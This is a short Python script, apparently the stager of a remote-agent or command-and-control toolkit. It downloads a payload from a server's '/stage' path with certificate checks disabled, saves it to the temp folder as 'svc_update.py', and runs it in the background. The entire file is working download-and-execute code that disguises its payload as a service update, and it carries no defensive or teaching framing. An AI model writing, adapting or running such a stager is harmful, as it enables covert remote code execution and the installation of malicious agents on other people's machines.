#!/usr/bin/env python3
"""Minimal stager - downloads full agent from server /stage and executes it."""
import sys, urllib.request, ssl, tempfile, subprocess, os

SERVER = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"
AGENT_ARGS = sys.argv[2:]

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

url = SERVER.rstrip("/") + "/stage"
try:
    with urllib.request.urlopen(url, context=ctx, timeout=30) as r:
        code = r.read()
except Exception as e:
    print(f"[!] stage download failed: {e}")
    sys.exit(1)

path = os.path.join(tempfile.gettempdir(), "svc_update.py")
with open(path, "wb") as f:
    f.write(code)

# copy public key next to agent if it's in CWD
pubkey_src = "server_public.pem"
pubkey_dst = os.path.join(os.path.dirname(path), "server_public.pem")
if os.path.exists(pubkey_src):
    with open(pubkey_src, "rb") as s, open(pubkey_dst, "wb") as d:
        d.write(s.read())
elif not os.path.exists(pubkey_dst):
    print("[!] WARNING: server_public.pem not found next to stager - "
          "agent will fail to register")

print(f"[*] Staged to {path}, launching...")
subprocess.Popen([sys.executable, path] + AGENT_ARGS)
